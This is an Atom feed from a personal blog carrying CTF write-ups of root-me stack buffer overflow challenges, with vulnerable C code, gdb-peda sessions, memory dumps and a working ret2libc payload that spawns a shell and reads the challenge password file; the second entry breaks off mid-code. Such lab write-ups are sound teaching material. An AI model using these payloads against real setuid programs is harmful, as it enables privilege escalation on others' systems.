<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>FINSENTY54</title>
  
  <subtitle>几处早莺争暖树，谁家新燕啄春泥。</subtitle>
  <link href="http://finsenty54.github.io/atom.xml" rel="self"/>
  
  <link href="http://finsenty54.github.io/"/>
  <updated>2020-12-31T06:24:17.481Z</updated>
  <id>http://finsenty54.github.io/</id>
  
  <author>
    <name>finsenty54</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ELF x86 - Stack buffer overflow basic 6</title>
    <link href="http://finsenty54.github.io/2020/12/31/Stack_buffer_overflow_basic_6/"/>
    <id>http://finsenty54.github.io/2020/12/31/Stack_buffer_overflow_basic_6/</id>
    <published>2020-12-31T06:08:34.000Z</published>
    <updated>2020-12-31T06:24:17.481Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ELF-x86-Stack-buffer-overflow-basic-6"><a href="#ELF-x86-Stack-buffer-overflow-basic-6" class="headerlink" title="ELF x86 - Stack buffer overflow basic 6"></a>ELF x86 - Stack buffer overflow basic 6</h1><p><code>return to libc</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> ** argv)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> message[<span class="number">20</span>];</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span> (<span class="string">&quot;Usage: %s &lt;message&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    setreuid(geteuid(), geteuid());</span><br><span class="line">    <span class="built_in">strcpy</span> (message, argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span> (<span class="string">&quot;Your message: %s\n&quot;</span>, message);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="知识学习"><a href="#知识学习" class="headerlink" title="知识学习"></a>知识学习</h2><h3 id="setuid-amp-setgid"><a href="#setuid-amp-setgid" class="headerlink" title="setuid &amp; setgid"></a>setuid &amp; setgid</h3><p>When the** setuid or setgid <strong>attributes are set on an executable file, then any users able to **execute the file will automatically execute the file with the privileges of the file’s owner (commonly root)</strong> and/or the file’s group, depending upon the flags set<br>普通用户提升权限运行<br>The setuid and setgid bits are normally set with the command chmod by setting the high-<strong>order octal digit to 4 for setuid or 2 for setgid</strong>. “chmod 6711 file” will set both the setuid and setgid bits (4+2=6), making the file read/write/executable for the owner (7), and executable by the group (first 1) and others (second 1). When a user other than the owner executes the file,** the process will run with user and group permissions set upon it by its owner**. For example, if the file is owned by user root and group wheel, it will run as root:wheel no matter who executes the file.<br><code>chmod +s</code></p><h3 id="防御-降权-seteuid"><a href="#防御-降权-seteuid" class="headerlink" title="防御-降权 seteuid()"></a>防御-降权 seteuid()</h3><p>Normal approach followed by root setuid programs is to drop root privileges before getting input from the user. Thus even when user input is malicious, attacker wont get a root shell.<br>root setuid接收用户输入后，丢弃root权限<br>For** example below vulnerable code **wont allow the attacker to get a root shell.</p><pre><code> seteuid(getuid()); /* Temporarily drop privileges */ </code></pre><h3 id="sticky-bit"><a href="#sticky-bit" class="headerlink" title="sticky bit"></a>sticky bit</h3><p>When a directory’s sticky bit is set, the filesystem treats the files in such directories in a special way <strong>so only the file’s owner,</strong> the directory’s owner, or root user can rename or delete the file. </p><pre><code>ls -l testchmod +t test; ls -l test</code></pre><h3 id="setreuid"><a href="#setreuid" class="headerlink" title="setreuid()"></a>setreuid()</h3><p><code>setreuid(geteuid(), geteuid());</code> 这是提升权限<br>每个Linux进程都有有两个相关的用户ID：实际用户ID（即ruid）和有效用户ID（即euid），其中ruid表示了该进程由谁运行，即当前系统环境用户是谁，主要回答who am I?的问题；而euid则用来规范进程的实际权限控制。比如passwd文件存放了用户名和密码，当一个普通用户运行passwd时，其ruid是自己，而euid则临时变为了文件的所有者root。<br>setreuid的作用在于设置ruid和euid</p><h3 id="geteuid"><a href="#geteuid" class="headerlink" title="geteuid()"></a>geteuid()</h3><p>geteuid()用来取得执行目前进程有效的用户识别码. 有效的用户识别码用来<strong>决定进程执行的权限,</strong> 借由此改变此值, 进程可以<strong>获得额外的权限</strong>. 倘若执行文件的setID 位已被设置, 该文件执行时, 其进程的euid值便会设成该文件所有者的uid. 例如, 执行文件/usr/bin/passwd 的权限为-r-s–x–x, 其s 位即为setID(SUID)位, 而当任何用户在执行passwd 时其有效的用户识别码会被设成passwd 所有者的uid 值, <strong>即root 的uid 值(0)</strong>.</p><pre><code>app-systeme-ch13@challenge02:~$ ls -l ./ch13-r-sr-x--- 1 app-systeme-ch13-cracked app-systeme-ch13 7360 May 19  2019 ./ch13</code></pre><h3 id="关闭ASLR-原来值是2"><a href="#关闭ASLR-原来值是2" class="headerlink" title="关闭ASLR 原来值是2"></a>关闭ASLR 原来值是2</h3><p>使用<code>sudo sh -c &quot;echo 0 &gt; /proc/sys/kernel/randomize_va_space&quot;</code>即可关闭ASLR</p><hr><h2 id="ret2lic入门"><a href="#ret2lic入门" class="headerlink" title="ret2lic入门"></a>ret2lic入门</h2><p><a href="https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-return-to-libc/">https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-return-to-libc/</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">//vuln.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line"> <span class="keyword">char</span> buf[<span class="number">256</span>]; <span class="comment">/* [1] */</span> </span><br><span class="line"> <span class="built_in">strcpy</span>(buf,argv[<span class="number">1</span>]); <span class="comment">/* [2] */</span></span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,buf); <span class="comment">/* [3] */</span></span><br><span class="line"> fflush(<span class="built_in">stdout</span>);  <span class="comment">/* [4] */</span></span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>r $(python2 -c &quot;print &#39;A&#39;*270&quot;)</code><br>溢出 64位下<br><code>Invalid $PC address: 0x414141414141</code></p><hr><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>逆向</p><pre><code>gdb-peda$ r $(python -c &quot;print &#39;a&#39;*36&quot;)Stopped reason: SIGSEGV0x61616161 in ?? ()</code></pre><p>查看</p><pre><code>gdb-peda$ print system$2 = &#123;&lt;text variable, no debug info&gt;&#125; 0xb7e68310 &lt;system&gt;gdb-peda$ print exit$3 = &#123;&lt;text variable, no debug info&gt;&#125; 0xb7e5b260 &lt;exit&gt;x/4000s $rsp0xbffffef8:     &quot;SHELL=/bin/bash&quot;gdb-peda$ x/s 0xbffffef8+60xbffffefe:     &quot;/bin/bash&quot;、x</code></pre><p>将这三项连接在一起<br><code>r $(python -c &quot;print &#39;a&#39;*32+&#39;\x10\x83\xe6\xb7&#39;+&#39;\x60\xb2\xe5\xb7&#39;+&#39;\xfe\xfe\xff\xbf&#39;&quot;) </code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ c</span><br><span class="line">Continuing.</span><br><span class="line">Your message: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaƒæ·`²å·þþÿ¿</span><br><span class="line">[New process <span class="number">5677</span>]</span><br><span class="line">process <span class="number">5677</span> is executing <span class="keyword">new</span> program: /bin/dash</span><br><span class="line">Error in re-setting breakpoint <span class="number">1</span>: Function <span class="string">&quot;main&quot;</span> <span class="keyword">not</span> defined.</span><br><span class="line">Warning:</span><br><span class="line">Cannot insert breakpoint <span class="number">2.</span></span><br><span class="line">Cannot access memory at address </span><br></pre></td></tr></table></figure><p>报错不成功</p><p><code>(gdb) info proc map</code><br>查看虚拟空间布局</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Start Addr   End Addr       Size     Offset objfile</span><br><span class="line"> 0x8048000  0x8049000     0x1000        0x0 /challenge/app-systeme/ch33/ch33</span><br><span class="line"> 0x8049000  0x804a000     0x1000        0x0 /challenge/app-systeme/ch33/ch33</span><br><span class="line"> 0x804a000  0x804b000     0x1000     0x1000 /challenge/app-systeme/ch33/ch33</span><br><span class="line">0xb7e27000 0xb7e28000     0x1000        0x0</span><br><span class="line">0xb7e28000 0xb7fd3000   0x1ab000        0x0 /libold/i386-linux-gnu/libc.so.6</span><br><span class="line">0xb7fd3000 0xb7fd5000     0x2000   0x1aa000 /libold/i386-linux-gnu/libc.so.6</span><br><span class="line">0xb7fd5000 0xb7fd6000     0x1000   0x1ac000 /libold/i386-linux-gnu/libc.so.6</span><br><span class="line">0xb7fd6000 0xb7fda000     0x4000        0x0</span><br><span class="line">0xb7fda000 0xb7fdd000     0x3000        0x0 [vvar]</span><br><span class="line">0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]</span><br><span class="line">0xb7fde000 0xb7ffe000    0x20000        0x0 /libold/i386-linux-gnu/ld-2.19.so</span><br><span class="line">0xb7ffe000 0xb7fff000     0x1000    0x1f000 /libold/i386-linux-gnu/ld-2.19.so</span><br><span class="line">0xb7fff000 0xb8000000     0x1000    0x20000 /libold/i386-linux-gnu/ld-2.19.so</span><br><span class="line">0xbffdf000 0xc0000000    0x21000        0x0 [stack]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>查找”/bin/sh”在libc中的位置</p><pre><code>gdb-peda$ searchmem &quot;/bin/sh&quot; 0xb7e27000 0xb7fd6000Searching for &#39;/bin/sh&#39; in range: 0xb7e27000 - 0xb7fd6000Found 1 results, display max 1 items:libc.so.6 : 0xb7f8ad4c (&quot;/bin/sh&quot;)</code></pre><p>或者<br><code>gdb-peda$ find &quot;/bin/sh&quot;</code></p><p>成功，中间exit()不用连接也可以</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">app-systeme-ch33@challenge02:~$ ./ch33 $(python -c <span class="string">&quot;print &#x27;a&#x27;*32+&#x27;\x10\x83\xe6\xb7&#x27;+&#x27;AAAA&#x27;+&#x27;\x4c\xad\xf8\xb7&#x27;&quot;</span>)</span><br><span class="line">Your message: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaƒæ·AAAAL­ø·</span><br><span class="line">$ id</span><br><span class="line">uid=1233(app-systeme-ch33-cracked) gid=1133(app-systeme-ch33) groups=1133(app-systeme-ch33),100(users)</span><br><span class="line">$ cat .passwd</span><br></pre></td></tr></table></figure><p><code>/bin/sh</code> used to point to<code>/bin/bash</code>on most GNU/Linux systems.</p><hr><p>查看布局的另一种方法<br><code>maintenance info sections ALLOBJ</code><br>Object file: /lib/x86_64-linux-gnu/libc.so.6<br> [0]      0x7ffff7de42e0-&gt;0x7ffff7de4304 at 0x000002e0: .note.gnu.build-id ALLOC LOAD READONLY DATA HAS_CONTENTS<br> [1]      0x7ffff7de4304-&gt;0x7ffff7de4324 at 0x00000304: .note.ABI-tag ALLOC LOAD READONLY DATA HAS_CONTENTS<br> [2]      0x7ffff7de4328-&gt;0x7ffff7de781c at 0x00000328: .hash ALLOC LOAD READONLY DATA HAS_CONTENTS<br> [3]      0x7ffff7de7820-&gt;0x7ffff7deb4d4 at 0x00003820: .gnu.hash ALLOC LOAD READONLY DATA HAS_CONTENTS<br> [4]      0x7ffff7deb4d8-&gt;0x7ffff7df9308 at 0x000074d8: .dynsym ALLOC LOAD READONLY DATA HAS_CONTENTS<br> [5]      0x7ffff7df9308-&gt;0x7ffff7dff3c9 at 0x00015308: .dynstr ALLOC LOAD READONLY DATA HAS_CONTENTS</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;ELF-x86-Stack-buffer-overflow-basic-6&quot;&gt;&lt;a href=&quot;#ELF-x86-Stack-buffer-overflow-basic-6&quot; class=&quot;headerlink&quot; title=&quot;ELF x86 - Stack buffer overflow basic 6&quot;&gt;&lt;/a&gt;ELF x86 - Stack buffer overflow basic 6&lt;/h1&gt;&lt;p&gt;&lt;code&gt;return to libc&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight cpp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;sys/types.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; argc, &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; ** argv)&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; message[&lt;span class=&quot;number&quot;&gt;20&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (argc != &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt; (&lt;span class=&quot;string&quot;&gt;&amp;quot;Usage: %s &amp;lt;message&amp;gt;\n&amp;quot;&lt;/span&gt;, argv[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    setreuid(geteuid(), geteuid());&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;strcpy&lt;/span&gt; (message, argv[&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt; (&lt;span class=&quot;string&quot;&gt;&amp;quot;Your message: %s\n&amp;quot;&lt;/span&gt;, message);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="APP system in root_me" scheme="http://finsenty54.github.io/categories/APP-system-in-root-me/"/>
    
    
    <category term="PWN" scheme="http://finsenty54.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>ELF x86 - stack buffer overflow basic 4</title>
    <link href="http://finsenty54.github.io/2020/12/29/stack_buffer_overflow_basic_4/"/>
    <id>http://finsenty54.github.io/2020/12/29/stack_buffer_overflow_basic_4/</id>
    <published>2020-12-29T13:26:05.000Z</published>
    <updated>2020-12-29T13:54:15.356Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ELF-x86-stack-buffer-overflow-basic-4"><a href="#ELF-x86-stack-buffer-overflow-basic-4" class="headerlink" title="ELF x86 - stack buffer overflow basic 4"></a>ELF x86 - stack buffer overflow basic 4</h1><p>参考: </p><ol><li><a href="https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%204">https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%204</a></li><li><a href="https://gitlab.com/rsheasby/root-me-app-system/-/blob/master/09.%20ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%204/instructions.md">https://gitlab.com/rsheasby/root-me-app-system/-/blob/master/09.%20ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%204/instructions.md</a></li><li><a href="http://showlinkroom.me/2017/12/04/Root-me-App-System02/">http://showlinkroom.me/2017/12/04/Root-me-App-System02/</a></li><li><a href="https://www.root-me.org/en/Challenges/App-System/ELF-x86-Stack-buffer-overflow-basic-4?action_solution=voir#ancre_solution">https://www.root-me.org/en/Challenges/App-System/ELF-x86-Stack-buffer-overflow-basic-4?action_solution=voir#ancre_solution</a></li></ol><h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><p><code>struct EnvInfo GetEnv(void)&#123;&#125;</code> 中有<code>strcpy()</code>函数，存在溢出点。</p><pre><code>            +----------------------------+            |      HOME env variable     |     %ebp - 540            +----------------------------+            |    USERNAME env variable   |     %ebp - 412            +----------------------------+            |      SHELL env variable    |     %ebp - 284            +----------------------------+            |      PATH env variable     |     %ebp - 156            +----------------------------+            |           saved ebp        |            +----------------------------+            |        return address      |     %ebp + 4            +----------------------------+            |   rep movsl dest. address  |     %ebp + 8            +----------------------------+  </code></pre><a id="more"></a><p>Since 540 - 128 = 412, 412 - 128 = 284 and 284 - 128 = 156, we get the following stack summary:</p><ul><li>%ebp - 540​ | env.home​​ ​​</li><li>%ebp - 412 | env.username</li><li>%ebp - 284 | env.shell</li><li>%ebp - 156 | env.path</li><li>%ebp | saved frame pointer</li><li>%ebp + 4 | saved EIP</li><li>%ebp + 8 | rep movsl destination address</li></ul><p>var char *dest @ ebp-0x21c</p><p>0x08048590 e8dbfdffff     sym.imp.strcpy ();[og] 第二次的赋值，USERNAME</p><pre><code>gdb-peda$ x/101xw 0xbffff3cc 存输入值0xbffff3cc:     0x61616161      0x61616161      0x61616161      0x616161610xbffff3dc:     0x61616161      0x61616161      0x61616161      0x616161610xbffff3ec:     0x61616161      0x61616161      0x61616161      0x616161610xbffff3fc:     0x61616161      0x61616161      0x61616161      0x616161610xbffff40c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff41c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff42c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff43c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff44c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff45c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff46c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff47c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff48c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff49c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff4ac:     0x61616161      0x61616161      0x61616161      0x616161610xbffff4bc:     0x61616161      0x61616161      0x61616161      0x616161610xbffff4cc:     0x61616161      0x61616161      0x61616161      0x616161610xbffff4dc:     0x61616161      0x61616161      0x61616161      0x616161610xbffff4ec:     0x61616161      0x61616161      0x61616161      0x616161610xbffff4fc:     0x61616161      0x61616161      0x61616161      0x616161610xbffff50c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff51c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff52c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff53c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff54c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff55c:     0x0804a000</code></pre><p><code>EAX: 0xbffff44c (&#39;a&#39; &lt;repeats 200 times&gt;...)</code><br>存shell 字符串</p><p><code>EAX: 0xbffff4cc (&#39;a&#39; &lt;repeats 128 times&gt;, &quot;e\377\377\277&quot;, &#39;a&#39; &lt;repeats 12 times&gt;)</code><br>放path</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">gdb-peda$</span><span class="bash"> disas GetEnv</span></span><br><span class="line">[...] # How much memory is allocated?</span><br><span class="line">0x080484aa &lt;+6&gt;:        sub    $0x22c,%esp      # (1)</span><br><span class="line">[...] # Let&#x27;s see what happens after the last &#x27;strcpy&#x27; call...</span><br><span class="line">   0x080485c0 &lt;+284&gt;:        call   0x8048390 &lt;strcpy@plt&gt; </span><br><span class="line">   0x080485c5 &lt;+289&gt;:        mov    0x8(%ebp),%eax # (2-dest)</span><br><span class="line">   0x080485c8 &lt;+292&gt;:        lea    -0x21c(%ebp),%edx # (3-source)</span><br><span class="line">   0x080485ce &lt;+298&gt;:        mov    $0x200,%ebx # (4-length) </span><br><span class="line">[...] # Some alignment details skipped...</span><br><span class="line">   0x08048602 &lt;+350&gt;:        mov    %ebx,%ecx # (4-length)</span><br><span class="line">   0x08048604 &lt;+352&gt;:        shr    $0x2,%ecx # (4-length)</span><br><span class="line">   0x08048607 &lt;+355&gt;:        mov    %eax,%edi # (2-dest)</span><br><span class="line">   0x08048609 &lt;+357&gt;:        mov    %edx,%esi # (3-source)</span><br><span class="line">   0x0804860b &lt;+359&gt;:        rep movsl %ds:(%esi),%es:(%edi)</span><br></pre></td></tr></table></figure><ul><li><p> program allocates 0x22c = 556 bytes (an EnvInfo struct is around 512 bytes long),</p></li><li><p> rep movsl … instruction at the end of the function, which consists of copying <strong>n long words **from %esi to %edi, with n being the value stored in **%ecx</strong> ;</p></li><li><p>it loads an address located at %ebp + 8 into the %edi register (destination address)</p></li><li><p>it loads the address of %ebp - 540 (0x21c = 540) into the %esi register (source address)</p></li><li><p>%ecx is initially set <strong>to 0x200(512) **and then **divided by 4 (shr $2)</strong>, i.e., %ecx <strong>equals 128</strong>. Hence, 128 long (4-bytes) words will be copied, resulting in the 512 bytes of the 4 buffers of an EnvInfo struct.</p><p>in order to output its EnvInfo struct, GetEnv <strong>creates a local struct</strong> where it stores the data first, and then, in its prologue**, GetEnv actually replicates the local struct into a “remote” struct, l<strong>ocated at the address read **at %ebp + 8</strong><br>还要复制结构体</p></li></ul><p><code> $PATH=$(python -c &#39;print &quot;/usr/local/bin:&quot; + &quot;A&quot; * (164-16)&#39;) peda -ex &quot;run&quot; ./ch8</code><br>这命令</p><p>如果打印420（412+4 =416 在这里输入4个字节，总长变为420） a，溢出</p><pre><code>gdb-peda$ x/16xb 0xbffff55c0xbffff55c:     0x61    0x61    0x61    0x61    0x00    0xf5    0xff    0xbf</code></pre><p>path后面跟着一个null \00<br>会改变指针值，结构体赋值到$ebp+8指向的地址处</p><p>打印416 a</p><pre><code>0xbffff55c:     0x08048600      0xbffff570</code></pre><p>没有改变ebp+8<br>这个地址是main中env结构体地址</p><h2 id="或者重新分配512字节可写空间"><a href="#或者重新分配512字节可写空间" class="headerlink" title="或者重新分配512字节可写空间"></a>或者重新分配512字节可写空间</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span> </span>&#123;</span><br><span class="line">        <span class="keyword">char</span> * ptr;</span><br><span class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">3</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Usage: %s &lt;environment var&gt; &lt;target program name&gt;\n&quot;</span>, 